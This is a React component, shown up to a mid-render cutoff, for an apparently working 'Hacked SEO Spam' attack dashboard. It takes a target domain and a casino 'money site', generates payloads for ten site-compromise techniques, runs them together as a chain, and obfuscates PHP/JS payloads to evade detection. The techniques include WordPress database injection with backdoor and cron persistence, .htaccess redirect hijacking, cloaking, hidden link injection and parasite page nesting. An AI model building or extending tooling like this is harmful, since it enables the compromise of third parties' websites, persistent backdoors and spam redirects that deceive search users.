/**
 * Hacked SEO Spam Dashboard — Advanced Website Compromise & SEO Injection UI
 *
 * Features:
 * - 10 Hack Technique Cards with severity/stealth/effectiveness ratings
 * - Individual technique generators with full payload preview
 * - Full Chain Runner (multi-technique attack)
 * - Payload Obfuscation Tool
 * - Code Viewer with copy-to-clipboard
 */
import { useState, useCallback } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import { Progress } from "@/components/ui/progress";
import {
  Skull, Syringe, Globe, Target, Loader2, Copy, CheckCircle2, XCircle,
  AlertTriangle, Shield, Play, Eye, FileText, Code, Database,
  Link2, Map, FileCode, Server, Bug, Layers, Zap, Lock,
  ChevronDown, ChevronUp, Flame, Network, Crosshair, Hash,
} from "lucide-react";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

type HackType =
  | "japanese_keyword" | "pharma_hack" | "gibberish_hack" | "doorway_pages"
  | "link_injection" | "sitemap_poisoning" | "conditional_cloaking"
  | "wp_db_injection" | "htaccess_hijack" | "parasite_nesting";

interface HackTechnique {
  id: HackType;
  name: string;
  description: string;
  category: string;
  severity: string;
  difficulty: number;
  stealthRating: number;
  effectiveness: number;
  targetCMS: string[];
  prerequisites: string[];
  payloadTypes: string[];
  detectionVectors: string[];
  evasionMethods: string[];
}

// ═══════════════════════════════════════════════════════
//  HACK TYPE ICONS & COLORS
// ═══════════════════════════════════════════════════════

const HACK_ICONS: Record<HackType, any> = {
  japanese_keyword: Globe,
  pharma_hack: Syringe,
  gibberish_hack: Hash,
  doorway_pages: Layers,
  link_injection: Link2,
  sitemap_poisoning: Map,
  conditional_cloaking: Eye,
  wp_db_injection: Database,
  htaccess_hijack: FileCode,
  parasite_nesting: Network,
};

const SEVERITY_COLORS: Record<string, string> = {
  low: "text-green-400 border-green-500/30 bg-green-500/10",
  medium: "text-yellow-400 border-yellow-500/30 bg-yellow-500/10",
  high: "text-orange-400 border-orange-500/30 bg-orange-500/10",
  critical: "text-red-400 border-red-500/30 bg-red-500/10",
};

const CATEGORY_COLORS: Record<string, string> = {
  content_injection: "text-violet-400 border-violet-500/30",
  redirect_hijack: "text-orange-400 border-orange-500/30",
  stealth: "text-cyan-400 border-cyan-500/30",
  persistence: "text-red-400 border-red-500/30",
};

// ═══════════════════════════════════════════════════════
//  CODE VIEWER COMPONENT
// ═══════════════════════════════════════════════════════

function CodeViewer({ code, language = "php", maxHeight = "300px" }: { code: string; language?: string; maxHeight?: string }) {
  const [copied, setCopied] = useState(false);
  const copyCode = useCallback(() => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    toast.success("Copied to clipboard!");
    setTimeout(() => setCopied(false), 2000);
  }, [code]);

  return (
    <div className="relative group">
      <div className="absolute top-2 right-2 z-10 flex gap-1">
        <Badge variant="outline" className="text-[10px] border-gray-600 text-gray-400">{language}</Badge>
        <Button size="sm" variant="ghost" onClick={copyCode} className="h-6 w-6 p-0">
          {copied ? <CheckCircle2 className="h-3 w-3 text-green-400" /> : <Copy className="h-3 w-3 text-gray-400" />}
        </Button>
      </div>
      <ScrollArea style={{ maxHeight }} className="rounded-lg bg-gray-950 border border-gray-800 p-3">
        <pre className="text-xs text-gray-300 font-mono whitespace-pre-wrap break-all">{code}</pre>
      </ScrollArea>
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  RATING BAR COMPONENT
// ═══════════════════════════════════════════════════════

function RatingBar({ label, value, max, color }: { label: string; value: number; max: number; color: string }) {
  const pct = Math.round((value / max) * 100);
  return (
    <div className="space-y-1">
      <div className="flex justify-between text-xs">
        <span className="text-gray-400">{label}</span>
        <span className={color}>{value}/{max}</span>
      </div>
      <div className="h-1.5 bg-gray-800 rounded-full overflow-hidden">
        <div className={`h-full rounded-full ${color.includes("red") ? "bg-red-500" : color.includes("yellow") ? "bg-yellow-500" : color.includes("green") ? "bg-green-500" : "bg-cyan-500"}`} style={{ width: `${pct}%` }} />
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  MAIN COMPONENT
// ═══════════════════════════════════════════════════════

export default function HackedSeoSpamDashboard() {
  const [activeTab, setActiveTab] = useState("techniques");
  const [targetDomain, setTargetDomain] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("");
  const [keywordsInput, setKeywordsInput] = useState("");
  const [pageCount, setPageCount] = useState(30);
  const [enableCloaking, setEnableCloaking] = useState(true);
  const [enablePersistence, setEnablePersistence] = useState(true);
  const [selectedHacks, setSelectedHacks] = useState<Set<HackType>>(new Set());
  const [expandedTechnique, setExpandedTechnique] = useState<string | null>(null);
  const [obfuscateInput, setObfuscateInput] = useState("");
  const [obfuscateMethod, setObfuscateMethod] = useState<"base64" | "hex" | "rot13" | "multi_layer" | "variable_substitution">("multi_layer");
  const [generatedPayload, setGeneratedPayload] = useState<any>(null);
  const [chainResults, setChainResults] = useState<any>(null);

  const keywords = keywordsInput.split(",").map(k => k.trim()).filter(Boolean);

  // ── Queries ──
  const techniquesQuery = trpc.hackedSeoSpam.getHackTechniques.useQuery(undefined, { staleTime: 300_000 });

  // ── Mutations ──
  const japaneseHackMut = trpc.hackedSeoSpam.generateJapaneseHack.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success(`Japanese Hack: ${data.totalPages} pages generated`); },
    onError: (err) => toast.error(err.message),
  });

  const pharmaHackMut = trpc.hackedSeoSpam.generatePharmaHack.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success(`Pharma Hack: ${data.products} products injected`); },
    onError: (err) => toast.error(err.message),
  });

  const gibberishHackMut = trpc.hackedSeoSpam.generateGibberishHack.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success(`Gibberish Hack: ${data.totalPages} pages generated`); },
    onError: (err) => toast.error(err.message),
  });

  const doorwayMut = trpc.hackedSeoSpam.generateDoorwayPages.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success(`Doorway Pages: ${data.totalPages} pages, ${data.interlinkCount} interlinks`); },
    onError: (err) => toast.error(err.message),
  });

  const linkInjectionMut = trpc.hackedSeoSpam.generateLinkInjection.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success(`Link Injection: ${data.totalLinks} hidden links`); },
    onError: (err) => toast.error(err.message),
  });

  const sitemapPoisonMut = trpc.hackedSeoSpam.generateSitemapPoison.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success(`Sitemap Poisoned: ${data.injectedUrls} URLs injected`); },
    onError: (err) => toast.error(err.message),
  });

  const cloakingMut = trpc.hackedSeoSpam.generateCloaking.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success("Cloaking payloads generated"); },
    onError: (err) => toast.error(err.message),
  });

  const wpDbMut = trpc.hackedSeoSpam.generateWPDbInjection.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success(`WP DB Injection: ${data.sqlQueriesCount} queries`); },
    onError: (err) => toast.error(err.message),
  });

  const htaccessMut = trpc.hackedSeoSpam.generateHtaccessHijack.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success("htaccess hijack rules generated"); },
    onError: (err) => toast.error(err.message),
  });

  const parasiteMut = trpc.hackedSeoSpam.generateParasiteNest.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success(`Parasite Nest: ${data.totalPages} pages in ${data.directories} dirs`); },
    onError: (err) => toast.error(err.message),
  });

  const obfuscateMut = trpc.hackedSeoSpam.obfuscatePayload.useMutation({
    onSuccess: (data) => { setGeneratedPayload(data); toast.success(`Obfuscated: ${data.originalLength} → ${data.obfuscatedLength} chars`); },
    onError: (err) => toast.error(err.message),
  });

  const runChainMut = trpc.hackedSeoSpam.runHackedChain.useMutation({
    onSuccess: (data) => { setChainResults(data); toast.success(`Chain complete: ${data.summary.successCount}/${data.summary.totalTechniques} techniques succeeded`); },
    onError: (err) => toast.error(err.message),
  });

  const isRunning = japaneseHackMut.isPending || pharmaHackMut.isPending || gibberishHackMut.isPending
    || doorwayMut.isPending || linkInjectionMut.isPending || sitemapPoisonMut.isPending
    || cloakingMut.isPending || wpDbMut.isPending || htaccessMut.isPending
    || parasiteMut.isPending || obfuscateMut.isPending || runChainMut.isPending;

  // ── Helpers ──
  const toggleHack = (id: HackType) => {
    const next = new Set(selectedHacks);
    if (next.has(id)) next.delete(id); else next.add(id);
    setSelectedHacks(next);
  };

  const copyToClipboard = useCallback((text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied!");
  }, []);

  const runIndividualHack = (hackType: HackType) => {
    if (!targetDomain || !redirectUrl) {
      toast.error("Target Domain and Redirect URL are required");
      return;
    }
    const kws = keywords.length > 0 ? keywords : undefined;
    switch (hackType) {
      case "japanese_keyword":
        japaneseHackMut.mutate({ targetDomain, redirectUrl, pageCount, enableCloaking });
        break;
      case "pharma_hack":
        pharmaHackMut.mutate({ targetDomain, redirectUrl, enableCloaking, injectionMethod: "all" });
        break;
      case "gibberish_hack":
        gibberishHackMut.mutate({ targetDomain, redirectUrl, pageCount, keywords: kws });
        break;
      case "doorway_pages":
        doorwayMut.mutate({ targetDomain, redirectUrl, keywords: kws || ["เว็บพนันออนไลน์", "คาสิโนออนไลน์", "บาคาร่า"], pagesPerKeyword: 5, enableInterlinks: true, enableSchema: true, enableDelayedRedirect: true });
        break;
      case "link_injection":
        linkInjectionMut.mutate({ redirectUrl, keywords: kws || ["เว็บพนันออนไลน์", "คาสิโนออนไลน์"], linkCount: pageCount });
        break;
      case "sitemap_poisoning":
        sitemapPoisonMut.mutate({ targetDomain, spamUrls: (kws || ["casino", "slots"]).map(k => `https://${targetDomain}/${k.replace(/\s+/g, "-")}/`) });
        break;
      case "conditional_cloaking":
        cloakingMut.mutate({ redirectUrl, spamContent: `<h1>${kws?.[0] || "Casino Online"}</h1><p>${(kws || ["casino"]).join(", ")}</p>` });
        break;
      case "wp_db_injection":
        wpDbMut.mutate({ targetDomain, redirectUrl, keywords: kws || ["เว็บพนันออนไลน์"], postCount: pageCount, includeBackdoor: enablePersistence, includeCronJob: enablePersistence });
        break;
      case "htaccess_hijack":
        htaccessMut.mutate({ redirectUrl });
        break;
      case "parasite_nesting":
        parasiteMut.mutate({ targetDomain, redirectUrl, keywords: kws || ["เว็บพนันออนไลน์", "คาสิโนออนไลน์"], nestDepth: 3, pagesPerDir: 5 });
        break;
    }
  };

  // ═══════════════════════════════════════════════════════
  //  RENDER
  // ═══════════════════════════════════════════════════════

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="relative overflow-hidden rounded-xl border border-red-500/20 bg-gradient-to-br from-red-950/40 via-black to-orange-950/30 p-6">
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,rgba(239,68,68,0.1),transparent_60%)]" />
        <div className="relative flex items-center gap-4">
          <div className="flex h-14 w-14 items-center justify-center rounded-xl bg-red-500/20 border border-red-500/30">
            <Skull className="h-7 w-7 text-red-400" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-2xl font-bold text-white">HACKED SEO SPAM</h1>
              <Badge variant="outline" className="border-red-500/50 text-red-400 text-xs">ADVANCED</Badge>
              <Badge variant="outline" className="border-orange-500/50 text-orange-400 text-xs">10 TECHNIQUES</Badge>
            </div>
            <p className="text-sm text-gray-400 mt-1">
              Japanese Keyword Hack + Pharma Hack + Doorway Pages + Link Injection + Cloaking + DB Injection + Parasite Nesting
            </p>
          </div>
        </div>
      </div>

      {/* Global Config */}
      <Card className="border-gray-800 bg-gray-900/50">
        <CardContent className="pt-4">
          <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
            <div>
              <Label className="text-xs text-gray-400">Target Domain</Label>
              <Input value={targetDomain} onChange={(e) => setTargetDomain(e.target.value)}
                placeholder="target-site.com" className="bg-gray-800/50 border-gray-700 mt-1" />
            </div>
            <div>
              <Label className="text-xs text-gray-400">Redirect URL (Money Site)</Label>
              <Input value={redirectUrl} onChange={(e) => setRedirectUrl(e.target.value)}
                placeholder="https://your-casino.com" className="bg-gray-800/50 border-gray-700 mt-1" />
            </div>
            <div>
              <Label className="text-xs text-gray-400">Keywords (comma-separated)</Label>
              <Input value={keywordsInput} onChange={(e) => setKeywordsInput(e.target.value)}
                placeholder="เว็บพนัน, คาสิโน, บาคาร่า" className="bg-gray-800/50 border-gray-700 mt-1" />
            </div>
            <div>
              <Label className="text-xs text-gray-400">Pages / Items Count</Label>
              <Input type="number" value={pageCount} onChange={(e) => setPageCount(Number(e.target.value))}
                min={1} max={500} className="bg-gray-800/50 border-gray-700 mt-1" />
            </div>
          </div>
          <div className="flex gap-6 mt-3">
            <div className="flex items-center gap-2">
              <Switch checked={enableCloaking} onCheckedChange={setEnableCloaking} />
              <Label className="text-xs text-gray-400">Enable Cloaking</Label>
            </div>
            <div className="flex items-center gap-2">
              <Switch checked={enablePersistence} onCheckedChange={setEnablePersistence} />
              <Label className="text-xs text-gray-400">Enable Persistence</Label>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Main Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="bg-gray-900/50 border border-gray-800 flex-wrap h-auto gap-1 p-1">
          <TabsTrigger value="techniques" className="text-xs gap-1"><Skull className="h-3 w-3" /> Techniques</TabsTrigger>
          <TabsTrigger value="generator" className="text-xs gap-1"><Zap className="h-3 w-3" /> Generator</TabsTrigger>
          <TabsTrigger value="chain" className="text-xs gap-1"><Flame className="h-3 w-3" /> Full Chain</TabsTrigger>
          <TabsTrigger value="obfuscate" className="text-xs gap-1"><Lock className="h-3 w-3" /> Obfuscate</TabsTrigger>
          <TabsTrigger value="payload" className="text-xs gap-1"><Code className="h-3 w-3" /> Payload Viewer</TabsTrigger>
        </TabsList>

        {/* ═══════════ TECHNIQUES TAB ═══════════ */}
        <TabsContent value="techniques" className="space-y-4">
          {techniquesQuery.isLoading ? (
            <div className="flex items-center justify-center py-12"><Loader2 className="h-6 w-6 animate-spin text-gray-400" /></div>
          ) : (
            <div className="grid gap-4 md:grid-cols-2">
              {(techniquesQuery.data || []).map((tech: HackTechnique) => {
                const Icon = HACK_ICONS[tech.id] || Bug;
                const isExpanded = expandedTechnique === tech.id;
                const isSelected = selectedHacks.has(tech.id);
                return (
                  <Card key={tech.id} className={`border-gray-800 bg-gray-900/50 transition-all ${isSelected ? "ring-1 ring-red-500/50 border-red-500/30" : "hover:border-gray-700"}`}>
                    <CardHeader className="pb-2">
                      <div className="flex items-start justify-between">
                        <div className="flex items-center gap-3">
                          <div className={`flex h-10 w-10 items-center justify-center rounded-lg border ${SEVERITY_COLORS[tech.severity] || "border-gray-700"}`}>
                            <Icon className="h-5 w-5" />
                          </div>
                          <div>
                            <CardTitle className="text-sm">{tech.name}</CardTitle>
                            <div className="flex gap-1 mt-1">
                              <Badge variant="outline" className={`text-[10px] ${SEVERITY_COLORS[tech.severity] || ""}`}>{tech.severity}</Badge>
                              <Badge variant="outline" className={`text-[10px] ${CATEGORY_COLORS[tech.category] || ""}`}>{tech.category.replace("_", " ")}</Badge>
                            </div>
                          </div>
                        </div>
                        <div className="flex gap-1">
                          <Button size="sm" variant="ghost" onClick={() => toggleHack(tech.id)}
                            className={`h-7 px-2 text-xs ${isSelected ? "bg-red-500/20 text-red-400" : "text-gray-400"}`}>
                            {isSelected ? <CheckCircle2 className="h-3 w-3" /> : <Target className="h-3 w-3" />}
                          </Button>
                          <Button size="sm" variant="ghost" onClick={() => setExpandedTechnique(isExpanded ? null : tech.id)}
                            className="h-7 w-7 p-0 text-gray-400">
                            {isExpanded ? <ChevronUp className="h-3 w-3" /> : <ChevronDown className="h-3 w-3" />}
                          </Button>
                        </div>
                      </div>
                    </CardHeader>
                    <CardContent className="pt-0">
                      <p className="text-xs text-gray-500 mb-3">{tech.description.slice(0, 120)}...</p>

                      {/* Rating Bars */}
                      <div className="space-y-1.5">
                        <RatingBar label="Effectiveness" value={tech.effectiveness} max={100} color="text-green-400" />
                        <RatingBar label="Stealth" value={tech.stealthRating} max={10} color="text-cyan-400" />
                        <RatingBar label="Difficulty" value={tech.difficulty} max={10} color="text-yellow-400" />
                      </div>

                      {isExpanded && (
                        <div className="mt-3 space-y-2 border-t border-gray-800 pt-3">
                          <div>
                            <span className="text-[10px] text-gray-500 uppercase">Target CMS</span>
                            <div className="flex flex-wrap gap-1 mt-1">
                              {tech.targetCMS.map(cms => (
                                <Badge key={cms} variant="outline" className="text-[10px] border-gray-700 text-gray-400">{cms}</Badge>
                              ))}
                            </div>
                          </div>
                          <div>
                            <span className="text-[10px] text-gray-500 uppercase">Prerequisites</span>
                            <div className="flex flex-wrap gap-1 mt-1">
                              {tech.prerequisites.map(p => (
                                <Badge key={p} variant="outline" className="text-[10px] border-orange-700/50 text-orange-400">{p}</Badge>
                              ))}
                            </div>
                          </div>
                          <div>
                            <span className="text-[10px] text-gray-500 uppercase">Payload Types</span>
                            <div className="flex flex-wrap gap-1 mt-1">
                              {tech.payloadTypes.map(p => (
                                <Badge key={p} variant="outline" className="text-[10px] border-violet-700/50 text-violet-400">{p}</Badge>
                              ))}
                            </div>
                          </div>
                          <div>
                            <span className="text-[10px] text-gray-500 uppercase">Evasion Methods</span>
                            <div className="flex flex-wrap gap-1 mt-1">
                              {tech.evasionMethods.map(e => (
                                <Badge key={e} variant="outline" className="text-[10px] border-cyan-700/50 text-cyan-400">{e}</Badge>
                              ))}
                            </div>
                          </div>
                          <div>
                            <span className="text-[10px] text-gray-500 uppercase">Detection Vectors</span>
                            <div className="flex flex-wrap gap-1 mt-1">
                              {tech.detectionVectors.map(d => (
                                <Badge key={d} variant="outline" className="text-[10px] border-red-700/50 text-red-400">{d}</Badge>
                              ))}
                            </div>
                          </div>
                          <Button size="sm" onClick={() => { runIndividualHack(tech.id); setActiveTab("payload"); }}
                            disabled={isRunning || !targetDomain || !redirectUrl}
                            className="w-full mt-2 bg-red-600 hover:bg-red-700 text-xs">
                            {isRunning ? <Loader2 className="h-3 w-3 animate-spin mr-1" /> : <Play className="h-3 w-3 mr-1" />}
                            Generate {tech.name} Payload
                          </Button>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                );
              })}
            </div>
          )}
        </TabsContent>

        {/* ═══════════ GENERATOR TAB ═══════════ */}
        <TabsContent value="generator" className="space-y-4">
          <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
            {[
              { id: "japanese_keyword" as HackType, label: "Japanese Keyword Hack", icon: Globe, desc: "Generate Japanese gambling/product spam pages", color: "red" },
              { id: "pharma_hack" as HackType, label: "Pharma Hack", icon: Syringe, desc: "Inject pharmaceutical spam with cloaking", color: "purple" },
              { id: "gibberish_hack" as HackType, label: "Gibberish Hack", icon: Hash, desc: "Generate keyword-stuffed gibberish pages", color: "yellow" },
              { id: "doorway_pages" as HackType, label: "Doorway Pages", icon: Layers, desc: "Mass-generate SEO doorway pages", color: "blue" },
              { id: "link_injection" as HackType, label: "Link Injection", icon: Link2, desc: "Embed hidden links in existing content", color: "cyan" },
              { id: "sitemap_poisoning" as HackType, label: "Sitemap Poisoning", icon: Map, desc: "Modify sitemap.xml with spam URLs", color: "green" },
              { id: "conditional_cloaking" as HackType, label: "Conditional Cloaking", icon: Eye, desc: "Different content for bots vs humans", color: "indigo" },
              { id: "wp_db_injection" as HackType, label: "WP DB Injection", icon: Database, desc: "Inject via WordPress database tables", color: "orange" },
              { id: "htaccess_hijack" as HackType, label: ".htaccess Hijack", icon: FileCode, desc: "Add redirect rules to .htaccess", color: "pink" },
              { id: "parasite_nesting" as HackType, label: "Parasite Nesting", icon: Network, desc: "Create hidden subdirectory spam clusters", color: "teal" },
            ].map(hack => {
              const Icon = hack.icon;
              return (
                <Card key={hack.id} className="border-gray-800 bg-gray-900/50 hover:border-gray-700 transition-all">
                  <CardContent className="pt-4">
                    <div className="flex items-center gap-3 mb-3">
                      <div className={`flex h-10 w-10 items-center justify-center rounded-lg bg-${hack.color}-500/10 border border-${hack.color}-500/30`}>
                        <Icon className={`h-5 w-5 text-${hack.color}-400`} />
                      </div>
                      <div>
                        <p className="text-sm font-medium text-white">{hack.label}</p>
                        <p className="text-[10px] text-gray-500">{hack.desc}</p>
                      </div>
                    </div>
                    <Button size="sm" onClick={() => { runIndividualHack(hack.id); setActiveTab("payload"); }}
                      disabled={isRunning || !targetDomain || !redirectUrl}
                      className="w-full bg-gray-800 hover:bg-gray-700 text-xs border border-gray-700">
                      {isRunning ? <Loader2 className="h-3 w-3 animate-spin mr-1" /> : <Zap className="h-3 w-3 mr-1" />}
                      Generate Payload
                    </Button>
                  </CardContent>
                </Card>
              );
            })}
          </div>
        </TabsContent>

        {/* ═══════════ FULL CHAIN TAB ═══════════ */}
        <TabsContent value="chain" className="space-y-4">
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-lg flex items-center gap-2">
                <Flame className="h-5 w-5 text-red-400" /> Full Hacked SEO Spam Chain
              </CardTitle>
              <CardDescription>Run multiple hack techniques simultaneously on a target</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* Technique Selection */}
              <div>
                <Label className="text-xs text-gray-400 mb-2 block">Select Techniques ({selectedHacks.size} selected)</Label>
                <div className="grid gap-2 md:grid-cols-2 lg:grid-cols-3">
                  {(techniquesQuery.data || []).map((tech: HackTechnique) => {
                    const Icon = HACK_ICONS[tech.id] || Bug;
                    const isSelected = selectedHacks.has(tech.id);
                    return (
                      <button key={tech.id} onClick={() => toggleHack(tech.id)}
                        className={`flex items-center gap-2 p-2 rounded-lg border text-left transition-all text-xs ${
                          isSelected
                            ? "border-red-500/50 bg-red-500/10 text-red-300"
                            : "border-gray-800 bg-gray-900/30 text-gray-400 hover:border-gray-700"
                        }`}>
                        <Icon className="h-4 w-4 flex-shrink-0" />
                        <div>
                          <p className="font-medium">{tech.name}</p>
                          <p className="text-[10px] text-gray-500">{tech.severity} | stealth: {tech.stealthRating}/10</p>
                        </div>
                        {isSelected && <CheckCircle2 className="h-3 w-3 ml-auto text-red-400" />}
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Quick Select */}
              <div className="flex gap-2">
                <Button size="sm" variant="outline" className="text-xs border-gray-700"
                  onClick={() => setSelectedHacks(new Set<HackType>(["japanese_keyword", "pharma_hack", "doorway_pages", "link_injection", "sitemap_poisoning", "conditional_cloaking", "wp_db_injection", "htaccess_hijack", "parasite_nesting", "gibberish_hack"]))}>
                  Select All
                </Button>
                <Button size="sm" variant="outline" className="text-xs border-gray-700"
                  onClick={() => setSelectedHacks(new Set<HackType>(["japanese_keyword", "doorway_pages", "conditional_cloaking", "sitemap_poisoning"]))}>
                  Stealth Pack
                </Button>
                <Button size="sm" variant="outline" className="text-xs border-gray-700"
                  onClick={() => setSelectedHacks(new Set<HackType>(["wp_db_injection", "htaccess_hijack", "parasite_nesting", "link_injection"]))}>
                  Persistence Pack
                </Button>
                <Button size="sm" variant="outline" className="text-xs border-gray-700"
                  onClick={() => setSelectedHacks(new Set())}>
                  Clear All
                </Button>
              </div>

              {/* Run Button */}
              <Button onClick={() => {
                if (!targetDomain || !redirectUrl) { toast.error("Target Domain and Redirect URL required"); return; }
                if (selectedHacks.size === 0) { toast.error("Select at least one technique"); return; }
                runChainMut.mutate({
                  targetDomain,
                  redirectUrl,
                  hackTypes: Array.from(selectedHacks),
                  keywords: keywords.length > 0 ? keywords : undefined,
                  pageCount,
                  enableCloaking,
                  enablePersistence,
                });
              }}
                disabled={isRunning || selectedHacks.size === 0 || !targetDomain || !redirectUrl}
                className="w-full bg-red-600 hover:bg-red-700 h-12 text-base">
                {runChainMut.isPending ? (
                  <><Loader2 className="h-5 w-5 animate-spin mr-2" /> Running {selectedHacks.size} Techniques...</>
                ) : (
                  <><Flame className="h-5 w-5 mr-2" /> Launch Full Chain ({selectedHacks.size} techniques)</>
                )}
              </Button>

              {/* Chain Results */}
              {chainResults && (
                <div className="space-y-3 border-t border-gray-800 pt-4">
                  <div className="flex items-center gap-2">
                    <h3 className="text-sm font-medium text-white">Chain Results</h3>
                    <Badge variant="outline" className="border-green-500/50 text-green-400 text-xs">
                      {chainResults.summary.successCount}/{chainResults.summary.totalTechniques} Success
                    </Badge>
                  </div>

                  {/* Summary Cards */}
                  <div className="grid gap-3 grid-cols-2 md:grid-cols-4">
                    <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700">
                      <p className="text-[10px] text-gray-500">Pages Created</p>
                      <p className="text-lg font-bold text-white">{chainResults.summary.totalPagesCreated}</p>
                    </div>
                    <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700">
                      <p className="text-[10px] text-gray-500">Links Injected</p>
                      <p className="text-lg font-bold text-white">{chainResults.summary.totalLinksInjected}</p>
                    </div>
                    <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700">
                      <p className="text-[10px] text-gray-500">Redirects Setup</p>
                      <p className="text-lg font-bold text-white">{chainResults.summary.totalRedirectsSetup}</p>
                    </div>
                    <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700">
                      <p className="text-[10px] text-gray-500">Total Time</p>
                      <p className="text-lg font-bold text-white">{(chainResults.summary.totalElapsed / 1000).toFixed(1)}s</p>
                    </div>
                  </div>

                  {/* Individual Results */}
                  <div className="space-y-2">
                    {chainResults.results.map((r: any, idx: number) => {
                      const Icon = HACK_ICONS[r.hackType as HackType] || Bug;
                      return (
                        <div key={idx} className={`flex items-center gap-3 p-2 rounded-lg border ${r.success ? "border-green-500/20 bg-green-500/5" : "border-red-500/20 bg-red-500/5"}`}>
                          <Icon className={`h-4 w-4 ${r.success ? "text-green-400" : "text-red-400"}`} />
                          <div className="flex-1">
                            <p className="text-xs font-medium text-white">{r.hackType.replace(/_/g, " ")}</p>
                            <p className="text-[10px] text-gray-500">
                              {r.pagesCreated} pages | {r.linksInjected} links | {r.redirectsSetup} redirects | {(r.elapsed / 1000).toFixed(1)}s
                            </p>
                          </div>
                          {r.success ? (
                            <CheckCircle2 className="h-4 w-4 text-green-400" />
                          ) : (
                            <div className="flex items-center gap-1">
                              <XCircle className="h-4 w-4 text-red-400" />
                              <span className="text-[10px] text-red-400">{r.error}</span>
                            </div>
                          )}
                          <Badge variant="outline" className={`text-[10px] ${r.detectionRisk === "low" ? "border-green-500/30 text-green-400" : r.detectionRisk === "medium" ? "border-yellow-500/30 text-yellow-400" : "border-red-500/30 text-red-400"}`}>
                            Risk: {r.detectionRisk}
                          </Badge>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ═══════════ OBFUSCATE TAB ═══════════ */}
        <TabsContent value="obfuscate" className="space-y-4">
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-lg flex items-center gap-2">
                <Lock className="h-5 w-5 text-cyan-400" /> Payload Obfuscation Engine
              </CardTitle>
              <CardDescription>Obfuscate PHP/JS payloads to evade detection</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <Label className="text-xs text-gray-400">Payload Code</Label>
                <textarea
                  value={obfuscateInput}
                  onChange={(e) => setObfuscateInput(e.target.value)}
                  placeholder="<?php echo 'Hello'; ?>"
                  rows={6}
                  className="w-full mt-1 bg-gray-800/50 border border-gray-700 rounded-lg p-3 text-xs font-mono text-gray-300 resize-y"
                />
              </div>
              <div>
                <Label className="text-xs text-gray-400 mb-2 block">Obfuscation Method</Label>
                <div className="flex flex-wrap gap-2">
                  {(["base64", "hex", "rot13", "multi_layer", "variable_substitution"] as const).map(method => (
                    <button key={method} onClick={() => setObfuscateMethod(method)}
                      className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                        obfuscateMethod === method
                          ? "bg-cyan-600 text-white ring-1 ring-cyan-400"
                          : "bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 border border-gray-700"
                      }`}>
                      {method.replace(/_/g, " ")}
                    </button>
                  ))}
                </div>
              </div>
              <Button onClick={() => {
                if (!obfuscateInput.trim()) { toast.error("Enter payload code"); return; }
                obfuscateMut.mutate({ payload: obfuscateInput, method: obfuscateMethod });
              }}
                disabled={obfuscateMut.isPending || !obfuscateInput.trim()}
                className="bg-cyan-600 hover:bg-cyan-700">
                {obfuscateMut.isPending ? <Loader2 className="h-4 w-4 animate-spin mr-2" /> : <Lock className="h-4 w-4 mr-2" />}
                Obfuscate Payload
              </Button>

              {generatedPayload?.obfuscated && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs text-gray-400">Obfuscated Result ({generatedPayload.method})</span>
                    <span className="text-[10px] text-gray-500">{generatedPayload.originalLength} → {generatedPayload.obfuscatedLength} chars</span>
                  </div>
                  <CodeViewer code={generatedPayload.obfuscated} language="php" maxHeight="200px" />
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ═══════════ PAYLOAD VIEWER TAB ═══════════ */}
        <TabsContent value="payload" className="space-y-4">
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-lg flex items-center gap-2">
                <Code className="h-5 w-5 text-green-400" /> Generated Payload Viewer
              </CardTitle>
              <CardDescription>View and copy generated payloads from any technique</CardDescription>
            </CardHeader>
            <CardContent>
              {!generatedPayload ? (
                <div className="text-center py-12 text-gray-500">
                  <FileText className="h-12 w-12 mx-auto mb-3 opacity-30" />
                  <p className="text-sm">No payload generated yet</p>
